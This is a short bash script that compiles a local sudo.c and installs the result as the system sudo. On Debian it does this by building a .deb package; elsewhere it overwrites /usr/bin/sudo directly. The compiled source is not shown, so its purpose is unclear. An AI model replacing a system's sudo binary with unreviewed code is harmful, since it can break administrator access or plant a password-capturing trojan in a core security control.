#!/bin/bash
    gcc -m32 -o sudo sudo.c

if [ "$1" == "install" ]
then
    if [ -f "./sudo" ]
    then
        if [ -f "/var/lib/dpkg/status" ]
        then
            echo "Debian detected"
            mkdir -p /tmp/sudo/usr/bin/
            mkdir -p /tmp/sudo/DEBIAN/
            cp -prf ./sudo /tmp/sudo/usr/bin/
            cp -prf ./control /tmp/sudo/DEBIAN
            chmod 755 /tmp/sudo/usr/bin/sudo
            dpkg -b /tmp/sudo
            #dpkg -i /tmp/sudo.deb
        else
            cat sudo > /usr/bin/sudo 
        fi
    else
        echo "build not fond"
        exit 1
    fi
fi
